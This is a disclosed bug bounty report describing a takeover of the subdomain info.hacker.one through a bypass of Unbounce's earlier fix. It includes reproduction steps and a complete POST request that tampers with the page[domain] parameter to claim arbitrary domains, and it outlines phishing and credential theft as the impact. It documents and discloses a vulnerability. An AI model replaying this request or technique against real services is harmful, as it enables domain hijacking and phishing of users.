# Subdomain takeover #2  at info.hacker.one

## Report Details
- **Report ID**: 209004
- **URL**: https://hackerone.com/reports/209004
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-02-26T02:25:15.267Z
- **Disclosed**: 2017-04-28T07:47:28.434Z

## Reporter
- **Username**: ak1t4
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**

Hi team, looking the fix released from unbounce team at https://hackerone.com/reports/202767 i've been able to bypass it and takeover again the subdomain info.hacker.one with a new __Vulnerable-Endpoint__ at UnbouncePages App

**Actual Dns Entry:**

{F164154}

### Steps To Reproduce & New PoC for HackerOne

1) I have claimed the domain and placed a __new-page__ for PoC validation located under: 
Go to -> http://info.hacker.one/full-takeover/
2) You see the alert box and the subdomain takeover

{F164155}
{F164156}

-

#### [ Unbounce Pages Team Section ]

#### Reproduction Steps PoC at new __Vulnerable-Endpoint__ 

1) Login to account
2) Create a New Page under any domain
3) Go to "Edit Notes"
4) Fill with any input 
5) Intercept Request with burp or another proxy
6) Add this body params:
&page%5Bdescription%5D=test&page%5Bdomain%5D=__anydomain.com__
7) Refresh page - You see the New Claimed Domain at Url Page
{F164159}
{F164161}


[ POST REQUEST ]

POST /2235922/pages/01a8aadb-0198-4fa6-815d-1ae641f0b49e HTTP/1.1
Host: app.unbounce.com
Connection: close
Content-Length: 119
X-NewRelic-ID: XQQAUl9ADAQFV1hW
Origin: https://app.unbounce.com
X-CSRF-Token: 1FSc6oHzQZPfCrlSKHCSXqwyCRn5q7YxTbkva6wQ2oI=
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
X-Requested-With: XMLHttpRequest
Referer: https://app.unbounce.com/2235922/pages/01a8aadb-0198-4fa6-815d-1ae641f0b49e
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.8,fi;q=0.6,en;q=0.4
Cookie: ...

utf8=%E2%9C%93&_method=put&authenticity_token=1FSc6oHzQZPfCrlSKHCSXqwyCRn5q7YxTbkva6wQ2oI%3D&page%5Bdescription%5D=test&page%5Bdomain%5D=__anydomain.com__&page%5Bpath%5D=full-takeover


#### Enpoint vulnerable: /[account-id]/pages/[page-id] 
#### param vulnerable: page%5Bdomain%5D=anydomain.com
#### This Request update the page with the New Domain (any domain could be used and creating content into it)
#### All branded domains under unbounce app are vulnerable

I create a new Private Video PoC here for the above explained -> https://youtu.be/cRf3zkdngh0

#### Security Impact at H1:

*An attacker can utilize this domain info.hacker.one for targeting the organization by fake login hackerOne forms, or steal sensitive information of teams (credentials, credit card information, etc) 

#### Security impact at Unbounce Pages:

*An attacker can utilize this bug affecting all branded domains and customers at unbouncepages.com
and use all domains with evil purposes as stealing of sensitive information, credentials, credit card info, etc


Please let me know if more info needed or any help,

Best Regards,
@ak1t4




## Attachments
- Captura_de_pantalla_2017-02-25_a_las_22.01.18.png
- Captura_de_pantalla_2017-02-25_a_las_21.56.11.png
- Captura_de_pantalla_2017-02-25_a_las_21.56.23.png
- Captura_de_pantalla_2017-02-25_a_las_23.02.35.png
- Captura_de_pantalla_2017-02-25_a_las_23.08.03.png
